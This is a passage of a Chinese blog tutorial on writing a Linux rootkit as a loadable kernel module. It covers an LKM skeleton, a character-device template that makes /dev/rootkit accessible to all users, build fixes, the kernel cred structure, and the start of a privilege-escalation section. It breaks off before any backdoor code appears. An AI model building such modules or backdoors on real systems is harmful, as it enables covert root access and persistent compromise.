    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在毕业论文选题时选的是Linux Rootkit相关的内容，加上在前面的许多文章中挖了这个坑终于是现在可以进行填坑活动了😭！</p><p>最近发现确实是有师傅在看我的blog的，并且也会有留言，虽然我每次回复的挺慢的（很少看留言后台），但是留言的条数不多目前在考虑要加上邮件通知不，看看留言的师傅是否会变多如果慢慢有的话可能就会加上了。（主要是懒不想加）</p><p>在前言这里就简单介绍一下Rootkit是什么。</p><p>Rootkit即root kit，直译为中文便是根权限工具包的意思，在今天的语境下更多指的是一种被作为驱动程序、加载到操作系统内核中的恶意软件，这一类恶意软件的主要用途便是驻留在计算机上提供 root 后门——当攻击者再次拿到某个服务器的 shell 时可以通过 rootkit 快速提权到 root。</p><p>Linux 下的 rootkit 主要以可装载内核模块（LKM）的形式存在，作为内核的一部分直接以 ring0 权限向入侵者提供服务；当攻击者拿到某台计算机的 shell 并通过相应的漏洞提权到 root 之后便可以在计算机中留下 rootkit，为攻击者后续入侵行为提供驻留的 root 后门。</p><p>但是作为内核的一部分，LKM 编程在一定意义上便是内核编程，与内核版本密切相关，只有使用相应版本内核源码进行编译的 LKM 才可以装载到对应版本的 kernel 上，这使得 Linux rootkit 显得有些鸡肋，且不似蠕虫病毒那般可以在服务期间肆意传播，但不可否认的是 LMK 仍是当前 Linux 下较为主流的 rootkit 技术之一。</p><h2 id="LKM基础"><a href="#LKM基础" class="headerlink" title="LKM基础"></a>LKM基础</h2><p>既然Linux Rootkit是以LKM的形式存在那么LKM算是最基础的内容了。</p><p><strong>LKM的全称为Loadable Kernel Modules，中文名为可加载内核模块，主要作用是用来扩展linux的内核功能。</strong>LKM的优点在于可以动态地加载到内存中，无须重新编译内核。由于LKM具有这样的特点，所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于rootkit技术当中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;test:module loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;test:module removed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里简单编一个LKM例子，这里简单介绍一下上述代码中的内容，最后面通过<code>module_init</code>宏定义了<code>rootkit_init</code>函数是该模块的初始化函数，会在该模块被加载时被执行，同样的使用了<code>module_exit</code>宏定义<code>rootkit_exit</code>函数则是该模块被卸载时会被执行即清除函数。这里给人的感觉类似于面对对象编程时的构造函数与析构函数不过不同的是这里如果是没有没有定义清楚函数则该模块是无法被清除的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[    4.146208] <span class="built_in">test</span>:module loaded</span><br><span class="line">[   26.022334] <span class="built_in">test</span>:module removed</span><br></pre></td></tr></table></figure><p>但是对于前面这样的程序是没有与用户态存在任何交互的，所以接下来我们需要像实现ctf赛题那样完成我们的rootkit。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">&quot;rootkit&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLASS_NAME <span class="meta-string">&quot;rootkit_class&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH <span class="meta-string">&quot;/dev/rootkit&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_open</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_read</span><span class="params">(struct file *__file, <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_release</span><span class="params">(struct inode *__inode, struct file *__file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">rootkit_ioctl</span><span class="params">(struct file *__file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> major_num;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *__<span class="title">inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">rootkit_fo</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = rootkit_ioctl,</span><br><span class="line">        .open = rootkit_open,</span><br><span class="line">        .read = rootkit_read,</span><br><span class="line">        .write = rootkit_write,</span><br><span class="line">        .release = rootkit_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    major_num = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;rootkit_fo);</span><br><span class="line">    <span class="keyword">if</span> (major_num &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> major_num;</span><br><span class="line"></span><br><span class="line">    module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_class))</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    module_device = device_create(module_class, <span class="literal">NULL</span>, MKDEV(major_num, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(module_device))</span><br><span class="line">    &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_device);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __file = filp_open(DEVICE_PATH, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(__file))</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(__file);</span><br><span class="line">    &#125;</span><br><span class="line">    __inode = file_inode(__file);</span><br><span class="line">    __inode-&gt;i_mode |= <span class="number">0666</span>;</span><br><span class="line">    filp_close(__file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;test:module loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">    class_destroy(module_class);</span><br><span class="line">    unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">    printk(<span class="string">&quot;test:module removed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure><p>上面给到一个ctf题目中驱动的大体模板，后续我们也将在这上面进行增加修改等，这里简单说一下在<code>rootkit_init</code>函数中，首先是注册了对应的设备名字，随后创建其class，最后创建设备。在创建完设备之后就可以在系统的<code>/dev</code>目录中看到。</p><p><img   src="/images/image-20240204162746884.png"  alt="image-20240204162746884"></p><p>最后这里给到编译驱动所需要的Makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += rootkit.o</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL_PATH := ./linux-5.11</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure><p>这里就不过多解释了相信大家都能看懂。不过好像在<code>linux 5.10</code>之后版本中会出现一些问题，这里在我遇到的问题做一个简单的汇总（不一定全对，因为我没有全部实验过）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">make -C ./linux-5.11 M=/media/psf/pwn/rootkit modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/media/psf/pwn/rootkit/linux-5.11&#x27;</span></span><br><span class="line">WARNING: Symbol version dump <span class="string">&quot;Module.symvers&quot;</span> is missing.</span><br><span class="line">         Modules may not have dependencies or modversions.</span><br><span class="line">make[3]: *** No rule to make target <span class="string">&#x27;scripts/module.lds&#x27;</span>, needed by <span class="string">&#x27;/media/psf/pwn/rootkit/rootkit.ko&#x27;</span>.  Stop.</span><br><span class="line">make[2]: *** [scripts/Makefile.modpost:117: __modpost] Error 2</span><br><span class="line">make[1]: *** [Makefile:1704: modules] Error 2</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/media/psf/pwn/rootkit/linux-5.11&#x27;</span></span><br><span class="line">make: *** [Makefile:5: all] Error 2</span><br></pre></td></tr></table></figure><p>在编译时遇到了这样一个问题，在我所指向的Linux内核路径下缺少了<code>script/module.lds</code>文件，导致编译出错。经过不断的查找网上说是因为我在编译内核时并没有编译驱动模块导致的，因为我编译内核时确实是使用的<code>make vmlinux / make bzImage</code>。所以我做的就是去编译一下驱动，但是因为我下载的Linux源码是在共享目录解包的缘故会存在解包不完全的情况导致在编译驱动时出现包含错误，并且我的ubuntu虚拟机已经有70G的大小了（懒狗一直没有进行清理过），这也导致我讲源码放到ubuntu家目录解包之后因为大小不足导致失败，所以是否真的可以通过<code>make modules</code>我也不知道。</p><p>最终的解决办法是<code>touch ./linux-5.11/script/module.lds</code>就好了！！！</p><p>至于为什么，是因为<code>scripts/module.lds</code> 文件通常用于链接内核模块（驱动程序）的符号表和地址。当你的驱动程序没有特定的链接脚本时，编译器会使用默认的链接脚本，其中包括一些默认的符号和地址。创建一个空的 <code>module.lds</code> 文件实际上是一种“占位符”方法。它告诉编译器：“嘿，我知道你需要一个链接脚本，但我不需要自定义的符号或地址。请使用默认的链接脚本”。因此，即使是空的 <code>module.lds</code> 文件也足够让编译器成功链接你的驱动程序。</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>usage;</span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>相信前面这个<code>cred</code>结构体大家都不陌生，在Linux中每一个进程在kernel中都有与之对应的cred结构体用以标识其权限。</p><p>这里主要关注其中的uid：</p><p>首先是结构体开头的uid即真实用户注释为<code>real UID of the task</code>，用于表示一个进程启动时的用户ID。</p><p>随后是suid即保存用户id注释为<code>saved UID of the task</code>，用于表示一个进程最初的有效ID。</p><p>然后是euid即有效用户id注释为<code>effective UID of the task</code>，用于标识一个进程正在运行时所属的用户ID，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的。</p><p>最后是fsuid即文件系统用户id注释为<code>UID for VFS ops</code>，用于标识一个进程创建文件时进行标识的用户ID。</p><h3 id="通过commit-creds-prepare-kernel-cred-NULL-提权"><a href="#通过commit-creds-prepare-kernel-cred-NULL-提权" class="headerlink" title="通过commit_creds(prepare_kernel_cred(NULL))提权"></a>通过commit_creds(prepare_kernel_cred(NULL))提权</h3><p>有kernel pwn基础的朋友都知道如果我们直接修改前面的所有uid为0即可实现提权，所以这里存在两种提权方式，一种是低版本内核版本的使用<code>commit_creds(prepare_kernel_cred(NULL))</code>进行提权，第二种就是通过直接修改cred结构体了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (daemon)</span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">validate_creds(old);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">put_cred(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">put_cred(<span class="keyword">new</span>);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_kernel_cred);</span><br></pre></td></tr></table></figure><p>可以看到在低版本的函数中如果传入的是NULL，则直接会去<code>init_cred</code>为old最后复制给new。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 